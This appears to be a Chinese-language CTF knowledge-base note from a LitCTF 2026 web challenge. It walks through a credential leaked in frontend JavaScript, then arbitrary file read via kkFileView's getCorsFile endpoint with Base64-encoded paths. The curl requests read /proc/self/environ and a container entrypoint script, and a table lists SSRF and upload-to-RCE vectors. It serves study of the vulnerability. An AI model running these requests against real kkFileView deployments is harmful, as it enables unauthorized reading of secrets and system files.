---
title: kkFileView 任意文件读取 — frontend credential leak + Base64 path traversal
category: web
tags: [lfi, kkfileview, base64, js-source-leak, credential-discovery]
triggers: [kkFileView, 文件预览, getCorsFile, urlPath, Base64, atob, 前端源码泄露, researcher密码, portal.js, docker-entrypoint, /proc/self/environ, 容器启动脚本]
created: 2026-06-07
updated: 2026-06-07
sources: [raw/LitCTF 2026 WEB方向全WP.md]
---

## Summary

前端 JS 源码泄露凭证 → kkFileView `getCorsFile` 接口通过 Base64 编码的 `urlPath` 参数实现任意文件读取 → 读取容器环境变量和启动脚本 → 定位 flag ZIP 并下载。

## Key Points

- 前端 JS 泄露凭证是常见入口：`portal.js` 中硬编码 `auth.seed`（Base64 解码 = `researcher:Research#2026`）
- kkFileView `getCorsFile` 原意是跨域文件预览，但未校验文件路径
- `atob()` 解码 → 路径以 Base64 传入（双重暗示：前端代码用 `atob()`），所有路径需 Base64 编码
- 目标：从容器元信息（`/proc`、启动脚本）中溯源 flag 位置

## Step-by-Step

### 1. 前端信息泄露

```html
<!-- 查看页面源码，搜索 .js -->
<script src="/assets/js/portal.js"></script>
```

`portal.js` 中：
```javascript
var bootstrap = {
  auth: { 
    seed: "cmVzZWFyY2hlcjpSZXNlYXJjaCMyMDI2"  // atob → researcher:Research#2026
  },
  fileGateway: { path: "/kkfileview/getCorsFile", queryKey: "urlPath" }
};
```

### 2. kkFileView 任意文件读取

```
GET /kkfileview/getCorsFile?urlPath=<Base64(文件路径)>
```

### 3. 读取容器环境变量

```bash
# /proc/self/environ → Base64
echo -n '/proc/self/environ' | base64
# L3Byb2Mvc2VsZi9lbnZpcm9u

curl "http://target/kkfileview/getCorsFile?urlPath=L3Byb2Mvc2VsZi9lbnZpcm9u"
```

### 4. 读取容器启动脚本（溯源 flag）

```bash
# /usr/local/bin/docker-entrypoint.sh → Base64
echo -n '/usr/local/bin/docker-entrypoint.sh' | base64
# L3Vzci9sb2NhbC9iaW4vZG9ja2VyLWVudHJ5cG9pbnQuc2g=

curl "http://target/kkfileview/getCorsFile?urlPath=L3Vzci9sb2NhbC9iaW4vZG9ja2VyLWVudHJ5cG9pbnQuc2g="
```

脚本中发现 flag 被打包进 `/opt/kkfileview/cache/parsed/q1_finance_report_2026.zip`。

### 5. 下载 flag ZIP

```bash
echo -n '/opt/kkfileview/cache/parsed/q1_finance_report_2026.zip' | base64
# L29wdC9ra2ZpbGV2aWV3L2NhY2hlL3BhcnNlZC9xMV9maW5hbmNlX3JlcG9ydF8yMDI2LnppcA==

curl "http://target/kkfileview/getCorsFile?urlPath=..." -o flag.zip
```

## kkFileView 漏洞模式

| 端点 | 参数 | 利用 |
|------|------|------|
| `/kkfileview/getCorsFile` | `urlPath=<Base64>` | 任意文件读取 |
| `/kkfileview/onlinePreview` | `url=<URL>` | SSRF |
| `/kkfileview/upload` | 文件上传 | 恶意文件预览触发 RCE |

## Connections
- Related: [[php-file-inclusion-filter]] (PHP LFI)
- Related: [[aictf-url-encoding-multi-proxy]] (编码绕过)
- Related: [[enterprise-document-report-attack-surface]] (kkFileView 属于文档预览组件)
- Source: [[raw/LitCTF 2026 WEB方向全WP]]
